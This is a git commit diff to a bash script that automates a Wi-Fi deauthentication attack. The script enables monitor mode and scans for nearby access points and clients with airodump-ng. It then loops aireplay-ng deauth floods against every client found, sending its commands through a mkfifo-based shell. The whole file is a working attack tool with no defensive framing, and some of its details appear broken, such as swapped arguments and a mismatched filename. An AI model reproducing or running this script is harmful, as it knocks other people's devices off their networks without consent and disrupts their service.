7e8e56a85fe504f6f83cae163a902acc083fbb0d
Dario-git-hub <dariomiguelnavarro822@gmail.com>
2025-05-13 08:09:27 +0000

    k

--- main.sh
+++ main.sh
@@ -1,24 +1,46 @@
 #!/bin/bash
-# TODO: #3 change the timeout command for the mkfifo shell-in-a-file
-function process(){
-    cat ${1} | tr -c ' ' '\n' | grep ':' >> ${1}-list
+# TODO: #3 change the timeout command for the mkfifo shell-in-a-file <- Done ☑
+# TODO: #4 change variables names to something understandable by humans
+
+# Functions
+
+function process-file (){
+    cat ${1} | tr -c ' ' '\n' | grep ':' | tee ${1}-list
 }
 
+function stop (){
+    sleep ${1}
+    echo '^C' > /tmp/shell
+}
+
+# Setup monitor mode with airmon-ng cuz with
 sudo airmon-ng start wlan1
-# Setup a simulated shell cuz i can't get the sh*tty timeout working
-mkfifo /tmp/shell; tail -f /tmp/shell | /bin/sh 2>&1 > /tmp/shell &
+
+# Setup a simulated shell cuz i can't get the sh*tty timeout command working
+mkfifo /tmp/shell
+tail -f /tmp/shell | /bin/sh 2>&1 > /tmp/shell &
+echo -e "script /dev/null -c bash\n" > /tmp/shell
+
 while true
 do
-    timeout -c 20 bash -c "sudo airodump-ng wlan1mon >> /tmp/a2f"
-    process /tmp/a2f
-    for af2 in $(cat /tmp/a2f-list)
+    echo -e "sudo airodump-ng wlan1mon | tee /tmp/devices\n" > /tmp/shell
+    stop 20
+
+    process-file /tmp/devices
+    
+    for af2 in $(cat /tmp/devices-list)
     do
-        timeout -c 12 bash -c "sudo airodump-ng --bssid ${af2} wlan1mon >> /tmp/a3z"
-        process /tmp/a3z
-        for az3 in $(cat /tmp/a3z-list)
+        echo -e "sudo airodump-ng --bssid ${af2} wlan1mon | tee /tmp/devices-in-wifi\n" > /tmp/shell
+        stop 12 
+        
+        process-file /tmp/devices-in-wifi
+
+        for az3 in $(cat /tmp/devices-in-wifi-list)
         do
-            timeout -c 30 bash -c "sudo aireplay-ng -0 0 -c ${af2} -a ${az3} wlan1mon"
+            echo -e "sudo aireplay-ng -0 0 -c ${af2} -a ${az3} wlan1mon\n" > /tmp/shell
+            stop 30
         done
-        rm /tmp/{a3z,a3z-list}
+        rm /tmp/{devices-in-wifi,devices-in-wifi-list}
     done
+    rm /tmp/{devices,device-list}
 done
